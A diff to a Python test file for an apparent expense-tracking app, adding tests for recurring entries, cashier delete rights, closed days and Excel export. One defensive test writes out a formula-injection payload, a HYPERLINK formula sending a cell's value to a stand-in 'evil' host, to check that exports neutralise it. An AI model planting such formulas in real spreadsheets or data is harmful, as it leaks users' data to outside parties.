@@ -46,7 +46,42 @@ def test_repeats_are_added_once_on_their_day(db):
     assert [(r["label"], r["day"]) for r in rows] == [("Rent", "2026-11-01")]  # salary's day hasn't come
     assert ex.run_repeats(db, now=NOV) == 0  # not twice
     assert ex.run_repeats(db, now=date(2026, 11, 30)) == 1
-    assert ex.run_repeats(db, now=date(2027, 2, 28)) == 2  # 30th → last day of February
+    assert ex.run_repeats(db, now=date(2027, 2, 28)) == 1  # salary: 30th → last day of February (rent is on the 1st)
+
+
+def test_a_deleted_repeat_entry_does_not_come_back_next_morning(db):
+    ex.save_repeat(db, T, {"category": "rent", "amount_paise": 2500000, "day_of_month": 1}, None)
+    ex.delete(db, T, db.rows("cash_expenses")[0]["id"])
+    assert ex.run_repeats(db, now=date(2026, 11, 23)) == 0 and db.rows("cash_expenses") == []
+
+
+def test_a_cashier_deletes_only_what_they_added_today(db):
+    row = ex.add(db, T, {"amount_paise": 5000, "category": "food"}, "cashier-1")
+    old = ex.add(db, T, {"amount_paise": 5000, "category": "food", "day": "2026-11-20"}, "cashier-1")
+    with pytest.raises(ex.ExpenseError, match="only what you added today"):
+        ex.delete(db, T, old["id"], user_id="cashier-1", manager=False)
+    with pytest.raises(ex.ExpenseError, match="only what you added today"):
+        ex.delete(db, T, row["id"], user_id="someone-else", manager=False)
+    ex.delete(db, T, row["id"], user_id="cashier-1", manager=False)
+
+
+def test_a_closed_day_takes_no_new_cash(db):
+    db.add("day_closings", tenant_id=T, day="2026-11-20")
+    with pytest.raises(ex.ExpenseError, match="already closed"):
+        ex.add(db, T, {"amount_paise": 100, "method": "cash", "day": "2026-11-20"}, None)
+    assert ex.add(db, T, {"amount_paise": 100, "method": "upi", "day": "2026-11-20"}, None)
+
+
+def test_the_excel_never_runs_a_formula(db):
+    from openpyxl import load_workbook
+    db.rows("deals")[0]["customer_name"] = '=HYPERLINK("http://evil/?"&B2,"Open")'
+    content, _ = ex.month_excel(db, T, "2026-11")
+    assert load_workbook(io.BytesIO(content))["Sales"]["C2"].value.startswith("'=")
+
+
+def test_stock_loss_stays_in_its_own_month(db):
+    db.add("stock_counts", tenant_id=T, status="finished", finished_at="2026-11-15T10:00:00+05:30", loss_paise=500000, gain_paise=0)
+    assert ex.month_view(db, T, "2026-10")["profit"]["expenses_paise"] == 0
 
 
 def test_real_profit(db):
